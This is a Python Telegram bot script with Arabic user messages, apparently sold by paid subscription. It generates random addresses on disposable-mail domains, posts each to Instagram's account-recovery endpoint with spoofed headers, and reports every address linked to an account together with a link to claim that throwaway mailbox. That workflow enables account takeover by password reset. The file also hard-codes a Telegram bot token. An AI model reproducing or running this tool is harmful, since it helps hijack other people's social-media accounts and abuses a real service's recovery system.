from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext,Filters,MessageHandler
import time
import requests
import secrets
from user_agent import generate_user_agent
import random
cookie = secrets.token_hex(8)*2
eeee = generate_user_agent()
r = requests.Session()
y = open("bot.txt","r").read().split()
updater = Updater('1698413492:AAHaM4-GIzqEZ5uaEzucrjgZ28T50H1T56s')
mk = "qwertyuioplkjhgfdsazxcvbnm"
mmm = ['@mailna.in','@mozej.com','@mailna.co','@mailna.me','@mohmal.im','@mohmal.in']
#######################
#https://www.mohmal.com/
#"toast_message"
#
#
#
#
########################


def start(update: Update, context: CallbackContext) -> None:
    chat_id = update.message.chat_id
    if str(chat_id) in y:
        update.message.reply_text(f'مرحبا {update.effective_user.first_name} اكيد ما تعرفني يس مرح تلاقي افضل مني اضغط هنا للبدء /mf')
        updater.dispatcher.add_handler(CommandHandler('mf', mf))
    else :
    	update.message.reply_text("هذا البوت ليس مجاني عليك الاشتراك هنا @x7x7z")


def mf(update: Update, context: CallbackContext) -> None:
    update.message.reply_text("هسه بدء الشغل")
    #updater.dispatcher.add_handler(MessageHandler(Filters.text, text))
    update.message.reply_text("لا تسوي شي في البوت انتظر ودعه يفحص")
    while True:
        mai = ""
        for i in range(7):
            ma = random.choice(mk)
            mai += ma
        time.sleep(10)
        for m in mmm:
            mail = "{}{}".format(mai,m)
            url = 'https://www.instagram.com/accounts/account_recovery_send_ajax/'
            data = {
                'email_or_username': mail,
                'recaptcha_challenge_field': '',
                'flow': '',
                'app_id': '',
                'source_account_id': '',
                }
            head = {
                "user-agent": eeee,
                'x-csrftoken': 'missing',
                'mid': cookie
                }
            req = r.post(url, data=data, headers=head)
            if ('"toast_message"') in req.text:
                update.message.reply_text("البريد الاكتروني : {}\nانشاء البريد هنا : {}".format(mail,"https://www.mohmal.com/"))
                
            
            time.sleep(30)
            
        time.sleep(60)
        
           
                
                    
                
       
            
   
       
            
   
                


       



#########################   	
 

##########################





    

########################



updater.dispatcher.add_handler(CommandHandler('start', start))



updater.start_polling()
updater.idle()







